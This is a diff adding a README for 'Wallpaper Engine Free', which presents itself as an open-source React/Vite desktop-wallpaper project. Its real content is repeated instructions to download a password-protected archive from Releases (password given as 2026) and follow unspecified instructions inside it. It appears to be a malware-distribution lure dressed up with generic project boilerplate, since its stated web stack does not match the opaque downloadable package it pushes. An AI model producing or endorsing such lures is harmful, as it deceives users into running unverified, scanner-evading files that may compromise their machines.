@@ -1,0 +1,138 @@
+Wallpaper Engine Free
+
+A desktop customization project focused on wallpapers and animated backgrounds.
+
+Overview
+
+Wallpaper Engine Free is a desktop wallpaper project built around the idea of making desktop customization accessible and straightforward.
+
+It focuses on visual backgrounds, animated wallpapers, and a simple experience for users who want to change the look of their desktop.
+
+This repository contains the project source code and downloadable releases.
+
+Features
+
+- Wallpaper customization — personalize the appearance of your desktop.
+- Animated backgrounds — support for animated wallpaper experiences.
+- Desktop-focused design — created with desktop use in mind.
+- Simple distribution — downloadable release packages.
+- Open-source codebase — project source is available on GitHub.
+
+The exact functionality may depend on the version included in the latest release.
+
+Download
+
+The recommended way to get the project is through GitHub Releases.
+
+1. Download wallpaper.engine.zip.
+2. Extract the archive.
+3. Enter the password when prompted.
+4. Follow the instructions included with the downloaded files.
+
+Archive password: 2026
+
+Browse all releases
+
+## Installation
+
+Installing Wallpaper Engine Free is simple. No development tools are required.
+
+Step 1 — Download
+
+Choose one of the following options:
+
+- Click the Download button in this README.
+- Or open GitHub Releases and download the wallpaper.engine.zip archive.
+
+Step 2 — Extract the archive
+
+Once the download is complete, locate wallpaper.engine.zip on your computer and extract its contents.
+
+Archive password: 2026
+
+Step 3 — Launch
+
+Open the extracted folder and follow the included instructions to launch the application.
+
+That's it! You're ready to get started.
+
+Technology Stack
+
+The project source uses the following technologies:
+
+| Technology | Purpose |
+|---|---|
+| React 19 | User interface |
+| Vite 8 | Development server and build tooling |
+| Tailwind CSS 4 | Styling |
+| JavaScript | Application logic |
+| ESLint | Code quality and linting |
+
+Project Structure
+
+The repository includes the main application configuration and source-related files.
+
+wallpaper-engine-free/
+├── public/
+├── src/
+├── index.html
+├── package.json
+├── package-lock.json
+├── vite.config.js
+├── eslint.config.js
+└── README.md
+
+Note: The directory layout above is a simplified overview. Refer to the repository for the current file structure.
+
+Development
+
+The project uses standard npm scripts:
+
+| Command | Description |
+|---|---|
+| npm run dev | Start the local development server |
+| npm run build | Build the project for production |
+| npm run preview | Preview the production build |
+| npm run lint | Run ESLint |
+
+Roadmap
+
+Planned areas of improvement:
+
+-  ] Improve the wallpaper browsing experience.
+- [ ] Expand customization options.
+- [ ] Improve the interface and usability.
+- [ ] Refine performance and resource usage.
+- [ ] Improve installation and setup documentation.
+- [ ] Add more detailed documentation for contributors.
+
+Contributing
+
+Contributions, suggestions, and bug reports are welcome.
+
+If you want to contribute:
+
+1. Fork this repository.
+2. Create a new branch for your changes.
+3. Make your changes and test them.
+4. Commit your work.
+5. Open a Pull Request with a description of the changes.
+
+For bug reports and feature suggestions, use [GitHub Issues.
+
+Issues and Support
+
+If you encounter a problem:
+
+- Check the existing Issues.
+- Open a new issue if the problem has not been reported.
+- Include the release version and steps to reproduce the issue.
+- Attach screenshots or error messages when relevant.
+
+Please avoid posting passwords, personal information, or other sensitive data in public issues.
+
+License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+  Wallpaper Engine Free · Open-source desktop customization project
